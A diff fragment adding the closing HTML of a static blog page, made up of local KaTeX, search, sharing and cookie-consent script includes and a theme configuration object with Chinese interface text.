+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.7fcad90fec5779332198a785f8ffb5af9cdf8d41a6fac42ff420bbb526d9c01b.css" integrity="sha256-f8rZD+xXeTMhmKeF+P+1r5zfjUGm+sQv9CC7tSbZwBs="></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.d15ac8c0ae2d09eb2a19e5080e0f3ebfa7190fb705e3b7d265395b38ad583b40.css" integrity="sha256-0VrIwK4tCesqGeUIDg8+v6cZD7cF47fSZTlbOK1YO0A="><script src="/lib/autocomplete/autocomplete.min.efcd9994416f8ef0e9904c0ebc34d39ab92f5fe72a60224553434d3a818b25e5.js" integrity="sha256-782ZlEFvjvDpkEwOvDTTmrkvX+cqYCJFU0NNOoGLJeU=" defer></script><script src="/lib/fuse/fuse.min.376aba77efa1c95e9d886fb00af55c096607a5cc8eb58ea8b024faf3a44a9914.js" integrity="sha256-N2q6d++hyV6diG+wCvVcCWYHpcyOtY6osCT686RKmRQ=" defer></script><script src="/lib/sharer/sharer.min.120e6e8efffc699bdbb3b51ae482f45d0b9670e4e3032651a29beac9d5692878.js" integrity="sha256-Eg5ujv/8aZvbs7Ua5IL0XQuWcOTjAyZRopvqydVpKHg=" async defer></script><script src="/lib/katex/katex.min.9f45307c5794ed247a0d095f3a62e52ef2215a67b2327203a7fd919959ae79d1.js" integrity="sha256-n0UwfFeU7SR6DQlfOmLlLvIhWmeyMnIDp/2RmVmuedE=" defer></script><script src="/lib/katex/auto-render.min.7b57d427ac6270677daf8d8380ded2cc73336f9149a167b8e1fe0d6ef66604ae.js" integrity="sha256-e1fUJ6xicGd9r42DgN7SzHMzb5FJoWe44f4NbvZmBK4=" defer></script><script src="/lib/katex/copy-tex.min.07770af90943a1de1a1010794bc78c6a7346d46d48fb63e35cc76ba76b827604.js" integrity="sha256-B3cK+QlDod4aEBB5S8eManNG1G1I+2PjXMdrp2uCdgQ=" defer></script><script src="/lib/katex/mhchem.min.f0ca03df194b8c3d6017ff455db6a0ef98857905663fa311a6cded788b15340b.js" integrity="sha256-8MoD3xlLjD1gF/9FXbag75iFeQVmP6MRps3teIsVNAs=" defer></script><script src="/lib/cookieconsent/cookieconsent.min.e55842a856a6d829feca3c3ad736c136b6c7549e9247274f78aa296259e06e24.js" integrity="sha256-5VhCqFam2Cn+yjw61zbBNrbHVJ6SRydPeKopYlngbiQ=" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"version":"v0.3.21-a85a6655"};</script><script src="/js/theme.min.c39230f13833caa156f38356df354d2075f7cc1f6f19e90a8a1f6a91c9d8ce91.js" integrity="sha256-w5Iw8TgzyqFW84NW3zVNIHX3zB9vGekKih9qkcnYzpE=" defer></script></body>
+</html>
